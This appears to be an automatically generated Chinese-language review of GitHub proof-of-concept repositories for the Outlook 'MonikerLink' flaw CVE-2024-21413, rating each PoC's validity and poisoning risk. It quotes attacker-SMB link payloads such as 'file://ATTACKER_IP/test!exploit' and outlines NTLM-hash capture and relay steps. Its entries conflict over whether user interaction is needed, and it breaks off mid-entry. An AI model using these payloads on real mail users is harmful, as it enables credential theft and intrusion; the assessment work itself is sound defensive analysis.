CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为 "MonikerLink" 漏洞。根据漏洞库信息和搜索结果，该漏洞是由于不正确的输入验证导致的。攻击者可以通过构造包含恶意链接的电子邮件，在用户未进行任何交互的情况下，远程执行代码。提供的漏洞利用代码 `README.md` 文件内容仅包含标题，无法判断其有效性。根据Github信息判断，存在可利用的POC。由于 `README.md` 文件过于简单，且未发现任何可疑代码，因此判定存在投毒代码的可能性为 0%。利用方式为，攻击者构造包含恶意 MonikerLink 的电子邮件，当 Outlook 处理该邮件时，漏洞被触发，从而允许攻击者执行任意代码。

**项目地址:** [Redfox-Secuirty/Unveiling-Moniker-Link-CVE-2024-21413-Navigating-the-Latest-Cybersecurity-Landscape](https://github.com/Redfox-Secuirty/Unveiling-Moniker-Link-CVE-2024-21413-Navigating-the-Latest-Cybersecurity-Landscape)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #11

**来源**: [CVE-2024-21413-ShubhamKanhere307_CVE-2024-21413.md](../2024/CVE-2024-21413-ShubhamKanhere307_CVE-2024-21413.md)

## CVE-2024-21413-Microsoft Outlook远程代码执行

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，CVSS评分9.8，允许远程代码执行

**影响版本:** 受影响版本包括但不限于：Microsoft Office 2016 (版本低于 16.0.5435.1001)，Microsoft Office 2019 (版本低于https://aka.ms/OfficeSecurityReleases)，Microsoft 365 Apps for Enterprise (版本低于 https://aka.ms/OfficeSecurityReleases)，Microsoft Office LTSC 2021 (版本低于 https://aka.ms/OfficeSecurityReleases)

**利用条件:** 攻击者需要诱骗受害者点击包含恶意链接的邮件。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-21413是一个Microsoft Outlook远程代码执行漏洞，也被称为"MonikerLink" bug。该漏洞源于不正确的输入验证。攻击者可以通过发送特制的电子邮件，诱使用户点击其中的恶意链接，从而在用户系统上执行任意代码。

**有效性分析：**

提供的POC代码尝试利用该漏洞。它创建一封包含HTML链接的电子邮件，该链接指向一个`file://` URL。 此URL试图访问远程SMB共享，从而可能导致NTLM凭据泄露或远程代码执行，这取决于服务器的配置和Outlook的漏洞利用机制。

**投毒风险分析：**

提供的`Exploit.py`脚本主要功能是发送电子邮件。代码中没有发现明显的恶意或隐藏的投毒代码。该脚本会获取发件人的Outlook电子邮件地址和密码，以及收件人的电子邮件地址和邮件主题。脚本允许用户选择是否添加链接附件。 如果选择添加，则会添加指向指定IP地址（例子中为`file://///192.168.0.103/test!exploit`）的链接，否则添加用户自定义的邮件正文。该脚本使用`smtplib`库连接到Outlook的SMTP服务器（`smtp-mail.outlook.com`），并发送电子邮件。 没有发现任何会将用户凭据泄露给第三方的行为。

**漏洞利用方式分析：**

该漏洞利用方式依赖于`file://`协议处理中的缺陷。当Outlook处理包含指向SMB共享的`file://`链接的电子邮件时，它可能会尝试自动访问该共享，从而可能泄露用户的NTLM凭据或允许攻击者执行任意代码。 该PoC 通过构造包含恶意链接的HTML电子邮件来尝试利用此漏洞。 攻击者诱使用户点击此链接，从而触发漏洞。

总而言之，POC代码尝试通过`file://`协议利用Outlook的漏洞来实现远程代码执行，虽然该POC本身没有明显的投毒代码，但成功利用依赖于目标的网络配置和安全设置。

**项目地址:** [ShubhamKanhere307/CVE-2024-21413](https://github.com/ShubhamKanhere307/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #12

**来源**: [CVE-2024-21413-ThemeHackers_CVE-2024-21413.md](../2024/CVE-2024-21413-ThemeHackers_CVE-2024-21413.md)

## CVE-2024-21413-Microsoft Outlook远程代码执行

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 严重，攻击者无需用户交互即可在目标系统上执行任意代码。

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021 (版本低于 https://aka.ms/OfficeSecurityReleases)

**利用条件:** 攻击者需要能够向受害者发送电子邮件。

**POC 可用性:** 是

**投毒风险:** 30%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也称为“MonikerLink”漏洞。根据漏洞库信息和搜索引擎结果显示，该漏洞允许攻击者在受害者的计算机上执行任意代码，而无需任何用户交互。这个漏洞是由于对输入验证不当造成的(CWE-20)。

**利用方式：**

1.  攻击者创建一个特制的电子邮件，其中包含恶意的链接或嵌入的内容。
2.  当受害者收到并打开此电子邮件时，Outlook 会尝试解析该链接。
3.  由于漏洞存在于 Outlook 的链接处理机制中，攻击者可以利用此漏洞绕过安全检查，从而执行任意代码。

**POC代码分析：**

提供的POC代码是一个Python脚本，用于发送包含HTML内容的电子邮件。该脚本从 `config.ini` 文件中读取发件人邮箱地址、密码、SMTP服务器和端口。然后它使用模板 `template/Stripo.html` 构造电子邮件的内容，并将收件人的邮箱地址和链接内容插入到HTML代码中。最后，该脚本使用smtplib库发送电子邮件。

**有效性评估：**

根据搜索引擎的结果 (特别是github链接: ThemeHackers/CVE-2024-21413) 和漏洞描述, 此POC是可用的,可以用于漏洞验证的.

**投毒风险分析：**

代码中存在一定的投毒风险，主要体现在以下几个方面：

*   **config.ini文件：** POC依赖于 `config.ini` 文件,需要用户配置邮箱账户和密码。 如果恶意攻击者提供了一个修改后的 `config.ini` 文件，其中包含错误的SMTP配置或恶意代码，可能导致用户的信息泄露或者执行未知的操作。
*   **template/Stripo.html模板：** HTML模板允许插入任意HTML代码，如果攻击者篡改了HTML模板, 就可以嵌入恶意的JavaScript或其他类型的脚本，在用户打开邮件时执行。
*   **依赖的外部库:** colorama, bgtask, configparser， 攻击者可能修改这些依赖，在用户本地执行恶意命令

总体而言，该POC的投毒风险大约为30%。 这个评估是基于对代码的分析以及对潜在攻击向量的理解。需要注意的是，具体的风险程度取决于攻击者的能力和目标用户的安全意识。

**项目地址:** [ThemeHackers/CVE-2024-21413](https://github.com/ThemeHackers/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #13

**来源**: [CVE-2024-21413-X-Projetion_CVE-2024-21413-Microsoft-Outlook-RCE-Exploit.md](../2024/CVE-2024-21413-X-Projetion_CVE-2024-21413-Microsoft-Outlook-RCE-Exploit.md)

## CVE-2024-21413-Microsoft-Outlook-RCE

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，无需用户交互即可远程执行任意代码

**影响版本:** 受影响版本包括 Microsoft Office 2016、2019、LTSC 2021 和 Microsoft 365 Apps for Enterprise，具体版本请参考CVE详情。

**利用条件:** 攻击者需要通过发送特制的电子邮件给受害者。

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2024-21413 漏洞，又名 MonikerLink bug，是一个 Microsoft Outlook 远程代码执行漏洞。攻击者可以通过发送包含恶意链接的电子邮件，在受害者未进行任何交互的情况下执行任意代码。该漏洞的根本原因是 Outlook 在处理 Moniker 链接时存在不当的输入验证。攻击者可以利用此漏洞绕过 Outlook 的安全策略，执行恶意代码。

**有效性：**
从提供的搜索引擎结果和漏洞库信息来看，该漏洞是一个已知的、高危的远程代码执行漏洞，并且有公开的 PoC 代码可用。参考链接 [https://github.com/ThemeHackers/CVE-2024-21413](https://github.com/ThemeHackers/CVE-2024-21413)。因此，提供的 PoC 代码很可能有效。

**投毒风险：**
提供的 PoC 代码包含一个 `exp.sh` 脚本和一个 README.md 文件。
*   `exp.sh` 脚本：该脚本的功能是发送包含恶意链接的电子邮件。其中包含 display_banner函数，send_email函数。`send_email`函数用于发送包含base64编码图片的HTML邮件，邮件内容包含一个URL。从代码本身来看，没有明显的恶意代码或后门，但存在潜在的风险：
    *   该脚本依赖于外部 SMTP 服务器，如果攻击者控制了 SMTP 服务器，可以篡改邮件内容。
    *   base64_image_string 变量中，包含一个PNG图片的Base64编码。攻击者可能会伪造图片内容，嵌入恶意代码，或者使用其他手段达到攻击的目的。
    *   link_url 变量，攻击者可以插入恶意链接，诱导用户点击。
    *   从经验判断，该漏洞的PoC更可能存在于精心构造的link_url, base64_image_string，或者其他的HTML代码片段中，通过某种方式绕过Outlook的安全检查，最终实现RCE，因此存在一定的投毒风险，但直接在exp.sh脚本里投毒的可能性较低。

    考虑到脚本的复杂性，且存在多种潜在的攻击方式，因此认为存在20%的投毒风险。

**利用方式：**
1.  攻击者准备好恶意的`link_url`和`base64_image_string`等变量内容。
2.  攻击者配置`exp.sh` 脚本，指定 SMTP 服务器、端口、用户名、密码、发件人邮箱、收件人邮箱和恶意链接。
3.  攻击者运行 `exp.sh` 脚本，向受害者发送包含恶意链接的电子邮件。
4.  受害者打开电子邮件，Outlook 处理邮件内容时，由于 MonikerLink 漏洞，恶意代码在受害者机器上执行。

综上所述，CVE-2024-21413 是一个高危的远程代码执行漏洞，利用方式简单，但需要精心构造恶意链接和邮件内容才能成功利用，同时要警惕PoC 代码中可能存在的投毒风险。

**项目地址:** [X-Projetion/CVE-2024-21413-Microsoft-Outlook-RCE-Exploit](https://github.com/X-Projetion/CVE-2024-21413-Microsoft-Outlook-RCE-Exploit)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #14

**来源**: [CVE-2024-21413-ahmetkarakayaoffical_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md](../2024/CVE-2024-21413-ahmetkarakayaoffical_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md)

## CVE-2024-21413-Microsoft Outlook Remote Code Execution Vulnerability

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 严重，允许攻击者在目标机器上执行任意代码

**影响版本:** 受影响版本包括Microsoft Office 2016, 2019, LTSC 2021, Microsoft 365 Apps for Enterprise等，具体版本范围参考漏洞库信息。

**利用条件:** 攻击者需要诱使用户打开包含恶意链接或内容的邮件。无需用户交互（zero-click NTLM leak）或仅需单次点击（one-click RCE）。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413是一个Microsoft Outlook远程代码执行漏洞，也被称为“MonikerLink”漏洞。根据漏洞库信息和搜索结果，此漏洞允许攻击者通过构造特殊的链接，在受害者无需交互或仅需极少交互的情况下，执行任意代码。利用方式主要有两种：

1.  **Zero-click NTLM Leak:** 攻击者可以诱使受害者打开包含恶意链接的邮件，该链接会触发NTLM凭据泄露，而无需受害者进行任何点击操作。
2.  **One-click RCE:** 攻击者可以诱使受害者点击邮件中的恶意链接，从而实现远程代码执行。

POC代码提供了一个Python脚本，该脚本利用SMTP认证发送包含恶意URL的电子邮件，模拟实际攻击场景。脚本需要SMTP服务器地址、端口、用户名、密码、发送者和接收者邮箱地址、恶意URL以及邮件主题等参数。

关于投毒风险，虽然POC代码本身旨在演示漏洞利用，但考虑到网络安全威胁的复杂性，以及攻击者可能对公开代码进行修改和传播，存在一定的投毒风险。例如，攻击者可能在POC代码中添加额外的恶意代码，用于窃取用户凭据或执行其他恶意操作。虽然提供的POC代码看起来比较简单，主要功能是发送包含恶意链接的邮件，但无法完全排除作者或其他人修改该代码并添加后门或恶意功能的可能性。因此，评估投毒风险为10%。使用前务必仔细审查代码，并在隔离环境中进行测试。

**请务必注意：**  该漏洞已在野外被利用，并已被CISA添加到已知被利用的漏洞目录中。强烈建议用户尽快安装Microsoft提供的安全更新。

**项目地址:** [ahmetkarakayaoffical/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability](https://github.com/ahmetkarakayaoffical/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #15

**来源**: [CVE-2024-21413-dshabani96_CVE-2024-21413.md](../2024/CVE-2024-21413-dshabani96_CVE-2024-21413.md)

## CVE-2024-21413 - Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行和系统权限获取

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021等。

**利用条件:** 攻击者需要诱使用户打开包含恶意链接或文件的电子邮件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为“MonikerLink”漏洞。攻击者可以利用此漏洞在受害者的计算机上执行任意代码，无需用户交互。

**有效性：**根据漏洞信息和搜索结果，此漏洞是一个零日漏洞，已被积极利用。POC 代码旨在利用此漏洞。但是,提供的POC 代码只是发送电子邮件的框架，需要配置 SMTP 服务器，用户名密码等信息，并且需要 SMB 服务器来捕获 NTLM hash，成功利用的可能性取决于环境配置和目标用户行为。

**投毒风险：** 代码主要功能是发送包含恶意链接的电子邮件，并启动 SMB 服务器捕获 NTLM hash。虽然代码包含发送邮件和捕获 NTLM hash的功能，但潜在的风险包括：
1.  **恶意HTML模板：** HTML模板可能包含恶意脚本，例如 JavaScript，如果用户打开邮件并允许执行脚本，可能导致客户端漏洞或信息泄露。
2.  **SMB服务器钓鱼：** 启动的 SMB 服务器可能被用于钓鱼，例如，捕获用户的 NTLM 哈希后尝试破解，或者利用捕获的凭据访问其他服务。
3. **依赖外部服务:** 依赖 SMTP 服务和 SMB 服务, 这些服务本身可能存在安全隐患.
整体投毒风险较低，约为10%，主要集中在HTML模板和配置是否含有恶意代码。

**利用方式：**
1.  攻击者构造包含恶意链接的电子邮件。
2.  受害者打开电子邮件并点击恶意链接。
3.  恶意链接利用 Outlook 的 MonikerLink 漏洞，在受害者计算机上执行任意代码，或者泄露NTLM Hash。
4. 攻击者启动 SMB 服务器，诱导 Outlook 客户端连接，捕获受害者的 NTLM 哈希。
5. 攻击者可以使用捕获的 NTLM 哈希进行进一步攻击，例如传递哈希攻击。

**项目地址:** [dshabani96/CVE-2024-21413](https://github.com/dshabani96/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #16

**来源**: [CVE-2024-21413-duy-31_CVE-2024-21413.md](../2024/CVE-2024-21413-duy-31_CVE-2024-21413.md)

## CVE-2024-21413 Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 严重，无需用户交互即可远程执行代码

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001)、Microsoft Office 2019、Microsoft 365 Apps for Enterprise 和 Microsoft Office LTSC 2021 (版本低于 https://aka.ms/OfficeSecurityReleases)

**利用条件:** 需要目标用户使用受影响的Outlook版本，并预览或点击包含恶意链接的邮件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是一个 Microsoft Outlook 远程代码执行漏洞，也称为 "MonikerLink" 漏洞。攻击者可以通过构造包含恶意 `file://` 链接的电子邮件，诱使用户点击或预览该邮件，从而在目标系统上执行任意代码。根据POC代码，攻击者可以使用一个 Expect 脚本发送特制的电子邮件，该邮件包含一个指向远程SMB服务器的 `file://` 链接。当 Outlook 处理此链接时，它会尝试连接到远程服务器，从而泄露用户的 NTLM 哈希值。如果攻击者能够破解哈希值或利用 NTLM 中继攻击，他们就可以获得对系统的访问权限。此外，此漏洞可以与CVE-2023-21716链接以达到远程代码执行的目的。

**有效性：**
提供的POC代码似乎有效，因为它演示了如何利用 `file://` 协议发送包含恶意链接的电子邮件。从漏洞信息和搜索引擎结果来看，该漏洞已经被积极利用。CISA 将其添加到已知被利用的漏洞列表中，表明该漏洞在现实世界中具有很高的威胁。

**投毒风险：**
虽然提供的代码主要目的是演示漏洞利用过程，但存在一些潜在的投毒风险。 Expect脚本本身没有明显的后门,主要利用了telnet发送恶意邮件. 但是，考虑到以下几点，风险评估为10%：
1.  **对外部依赖的信任：** 该脚本依赖于 `expect` 工具，如果该工具被篡改，则可能引入恶意行为。
2.  **脚本执行环境：** 该脚本的执行环境可能存在安全漏洞，攻击者可以利用这些漏洞来执行恶意代码。
3.  **社会工程学：** 攻击者可能会修改脚本以使其更具欺骗性，例如伪造发件人地址或使用更具吸引力的主题行，从而提高攻击成功率。

**利用方式：**
1.  攻击者设置一个 SMB 服务器来监听传入的连接。
2.  攻击者使用提供的 `cve-2024-21413.sh` 脚本生成包含恶意 `file://` 链接的电子邮件。
3.  攻击者将该电子邮件发送给目标用户。
4.  当目标用户在受影响的 Outlook 版本中预览或点击该邮件中的链接时，Outlook 会尝试连接到攻击者的 SMB 服务器。
5.  此连接会导致用户的 NTLM 哈希值被发送到攻击者的服务器。
6.  攻击者可以使用破解工具（如 Hashcat）破解哈希值，或者利用 NTLM 中继攻击来获得对目标系统的访问权限。
7. 攻击者可以将此漏洞与 CVE-2023-21716 结合使用，以实现远程代码执行。


**项目地址:** [duy-31/CVE-2024-21413](https://github.com/duy-31/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #17

**来源**: [CVE-2024-21413-gurleen-147_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability-PoC.md](../2024/CVE-2024-21413-gurleen-147_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability-PoC.md)

## CVE-2024-21413-Microsoft Outlook远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021 (在指定版本范围内)

**利用条件:** 受害者需要点击攻击者发送的包含恶意链接的邮件。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-21413 是一个 Microsoft Outlook 远程代码执行漏洞。根据提供的漏洞利用代码（exploit.py），攻击者通过发送特制的 HTML 邮件，诱骗受害者点击邮件中的 `file://ATTACKER_IP/test!exploit` 链接。此链接利用 MonikerLink 绕过安全警告，从而可能导致任意代码执行。POC 代码本身未发现隐藏的恶意代码，因此投毒风险较低。利用方式是，攻击者需要搭建一个 SMB 服务器，当受害者点击链接时，Outlook 尝试访问该 SMB 服务器上的共享资源，攻击者可以利用这一过程执行恶意代码。漏洞库信息也验证了这是一个高危漏洞，且已经被CISA添加到已知被利用漏洞列表中(KEV)。

**项目地址:** [gurleen-147/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability-PoC](https://github.com/gurleen-147/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability-PoC)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #18

**来源**: [CVE-2024-21413-hau2212_Moniker-Link-CVE-2024-21413-.md](../2024/CVE-2024-21413-hau2212_Moniker-Link-CVE-2024-21413-.md)

## CVE-2024-21413-Microsoft Outlook远程代码执行

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行，完全控制受害者系统

**影响版本:** 受影响版本包括Microsoft Office 2016, 2019, LTSC 2021以及Microsoft 365 Apps for Enterprise的特定版本。具体版本范围请参考漏洞库信息。

**利用条件:** 需要受害者打开包含恶意链接的邮件

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞CVE-2024-21413是一个Microsoft Outlook远程代码执行漏洞，利用方式是诱骗用户点击邮件中的`file://`链接。根据提供的漏洞利用代码，攻击者需要设置攻击机IP地址和邮件服务器地址，然后发送包含特定HTML内容的邮件。HTML内容包含一个`file://ATTACKER_MACHINE/test!exploit`链接，当用户点击此链接时，Outlook会尝试访问攻击者机器上的指定路径，如果攻击者在相应路径放置了恶意文件，就可以实现远程代码执行。从代码本身看，没有发现明显的投毒代码。代码的目的是构建包含恶意链接的HTML邮件并发送出去。该漏洞的有效性依赖于目标系统是否受到补丁保护以及攻击者是否能够成功搭建恶意文件服务器。由于CISA已经将此漏洞添加到已知被利用漏洞列表中，并且存在可用的POC，因此利用的有效性较高。攻击者需要控制一个服务器，并在服务器上放置恶意的payload，并通过构造恶意的file://链接诱导用户点击。

**分析：**

1.  **有效性：**根据提供的POC代码和漏洞库信息，该漏洞是有效的。CISA将其添加到已知被利用漏洞列表中，说明该漏洞已被实际利用。提供的POC代码可以用于生成包含恶意链接的电子邮件。
2.  **投毒风险：**经过对POC代码的分析，没有发现明显的投毒代码。代码的功能明确，就是生成并发送包含恶意链接的电子邮件，并没有额外恶意行为。
3.  **利用方式：**
    *   攻击者构建一个包含恶意`file://`链接的HTML邮件。
    *   攻击者将邮件发送给目标用户。
    *   目标用户打开邮件并点击恶意链接。
    *   Outlook尝试访问攻击者控制的服务器上的恶意文件。
    *   如果攻击者在服务器上放置了恶意payload，且Outlook执行该payload，则实现远程代码执行。

**漏洞缓解措施：**

*   及时安装Microsoft官方发布的补丁。
*   谨慎点击邮件中的链接，特别是来自未知发件人的邮件。
*   配置Outlook的安全设置，限制对`file://`协议的使用。


**项目地址:** [hau2212/Moniker-Link-CVE-2024-21413-](https://github.com/hau2212/Moniker-Link-CVE-2024-21413-)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #19

**来源**: [CVE-2024-21413-olebris_CVE-2024-21413.md](../2024/CVE-2024-21413-olebris_CVE-2024-21413.md)

## CVE-2024-21413-Microsoft Outlook 远程代码执行

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，允许攻击者在受害者机器上执行任意代码。

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise 和 Microsoft Office LTSC 2021 (版本低于 aka.ms/OfficeSecurityReleases 中指示的版本).

**利用条件:** 攻击者需要诱使用户打开特制的电子邮件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是一项 Microsoft Outlook 远程代码执行漏洞，也称为“MonikerLink”漏洞。攻击者可以通过发送特制的电子邮件来利用此漏洞，受害者无需进行任何用户交互即可触发。从搜索引擎结果和漏洞库信息来看，该漏洞影响多个版本的Microsoft Outlook。提供的PoC代码是一个Python脚本，用于发送包含恶意链接的电子邮件。脚本构造了一个包含纯文本和HTML部分的电子邮件，其中HTML部分可能包含利用该漏洞的恶意链接。投毒风险评估：代码本身除了常规的邮件发送功能外，在image_base64变量中发现一段疑似图片base64编码的字符串, 但该字符串过长, 不排除其中含有恶意代码的可能性, 因此判断存在一定的投毒风险，概率估计为10%。利用方式：攻击者首先搭建SMTP服务器，然后使用此脚本构造包含恶意URL的电子邮件，并将其发送给目标用户。当目标用户打开电子邮件时，Outlook将尝试加载恶意URL，导致代码执行。

**项目地址:** [olebris/CVE-2024-21413](https://github.com/olebris/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #20

**来源**: [CVE-2024-21413-r00tb1t_CVE-2024-21413-POC.md](../2024/CVE-2024-21413-r00tb1t_CVE-2024-21413-POC.md)

## CVE-2024-21413 - Microsoft Outlook远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 严重，无需用户交互即可远程执行代码，可能导致完全控制受影响的系统。

**影响版本:** Microsoft Office 2016版本 < 16.0.5435.1001, Microsoft Office 2019版本 < https://aka.ms/OfficeSecurityReleases, Microsoft 365 Apps for Enterprise版本 < https://aka.ms/OfficeSecurityReleases, Microsoft Office LTSC 2021版本 < https://aka.ms/OfficeSecurityReleases

**利用条件:** 攻击者需要知道受害者的邮箱地址，并能够通过SMTP发送邮件。受害者需要点击邮件中的恶意链接。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413，也被称为“MonikerLink”漏洞，是一个存在于Microsoft Outlook中的零日漏洞。此漏洞允许攻击者通过发送特制的电子邮件在受害者计算机上执行任意代码，而无需任何用户交互。根据描述，利用方式是：攻击者发送包含恶意链接的电子邮件，当用户点击链接时，Outlook会尝试访问链接指向的`file:///` URL，导致执行攻击者控制的代码。提供的POC代码模拟了发送包含恶意链接的电子邮件的过程。该链接指向攻击者控制的SMB共享，当Outlook尝试访问此共享时，受害者的NTLM哈希会被发送到攻击者处。利用此漏洞通常需要用户点击邮件中的链接。关于投毒风险，虽然POC代码本身实现了漏洞利用，但是README中指示要运行`impacket-smbserver` ，并且提供了进一步利用CVE-2023-21716的思路，结合免责声明可以判断，作者主观上没有进行恶意投毒行为，但是客观上如果使用者继续利用可能会进行恶意投毒攻击，因此存在一定的投毒风险，概率约为10%。漏洞库信息和搜索引擎结果均证实了该漏洞的存在和严重性，以及其远程代码执行的性质。

**项目地址:** [r00tb1t/CVE-2024-21413-POC](https://github.com/r00tb1t/CVE-2024-21413-POC)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #21

**来源**: [CVE-2024-21413-th3Hellion_CVE-2024-21413.md](../2024/CVE-2024-21413-th3Hellion_CVE-2024-21413.md)

## CVE-2024-21413 - Microsoft Outlook Remote Code Execution

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 高危，允许攻击者在目标系统上执行任意代码

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001)，Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021，直到aka.ms/OfficeSecurityReleases上发布的修复版本。

**利用条件:** 需要受害者打开包含恶意链接的电子邮件。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-21413，也被称为“MonikerLink”漏洞，是 Microsoft Outlook 中的一个远程代码执行漏洞。攻击者可以通过发送特制的电子邮件，诱导受害者点击其中的恶意链接，从而在受害者系统上执行任意代码。

**有效性分析：**
根据漏洞库信息和搜索引擎结果，此漏洞是真实存在的，并且已经被积极利用。提供的POC代码尝试通过发送包含`file://`协议URL的电子邮件，来触发漏洞。这种方法利用了Outlook处理`file://`链接时的不当输入验证。

**投毒风险分析：**
检查提供的Python脚本和README文件，没有发现明显的恶意代码或后门。脚本的主要功能是构建和发送包含恶意链接的电子邮件。风险主要在于：

*   **脚本可能被修改：**  攻击者可能修改该脚本，例如更改默认的IP地址，添加额外的payload等，用以进行更隐蔽或更具破坏性的攻击。
*   **依赖项风险：**  脚本依赖于`smtplib`库，理论上，该库本身也可能存在潜在的安全问题，但这种可能性较低。
*   **密码泄露风险：** 使用脚本时，发送者的电子邮件密码会以明文形式传递，存在泄露的风险。
*  **接收者打开邮件和点击链接:** 接收者需要打开邮件，并且点击邮件中的链接才会触发，一定程度上限制了利用成功率

因此，将该POC代码本身视为投毒的概率较低，大约为5%。

**利用方式分析：**
1.  **攻击者准备：**
    *   攻击者需要一个SMTP服务器来发送电子邮件。
    *   攻击者需要一个可访问的服务器，并监听特定的端口，以便在受害者点击链接后接收连接。
2.  **漏洞利用：**
    *   攻击者使用POC脚本，指定发送者、接收者、SMTP服务器和攻击者监听的IP地址。
    *   脚本构建包含`file://{args.ip}/` URL的电子邮件，并将其发送给受害者。
3.  **受害者交互：**
    *   受害者打开电子邮件，并点击其中的链接。
    *   Outlook尝试访问`file://{args.ip}/` URL，由于输入验证不足，可能导致执行恶意代码。

总而言之，该漏洞的利用方式依赖于发送包含恶意`file://`链接的电子邮件，并诱导受害者点击该链接。成功利用该漏洞，可以导致远程代码执行。


**项目地址:** [th3Hellion/CVE-2024-21413](https://github.com/th3Hellion/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #22

**来源**: [CVE-2024-21413-xaitax_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md](../2024/CVE-2024-21413-xaitax_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md)

## CVE-2024-21413 - Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，未经身份验证的攻击者可以通过发送特制的电子邮件，在受害者系统上执行任意代码。

**影响版本:** Microsoft Office 2016 版本低于 16.0.5435.1001；Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021 版本低于安全更新版本。

**利用条件:** 需要受害者打开包含恶意链接或内容的电子邮件。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为 “MonikerLink” 漏洞。攻击者可以利用此漏洞通过发送特制的电子邮件来执行任意代码，而无需用户交互。

**利用方式：**
1.  攻击者构造包含恶意 MonikerLink 的电子邮件。
2.  受害者打开电子邮件。
3.  Outlook 解析恶意 MonikerLink，导致代码执行。

**有效性评估：**
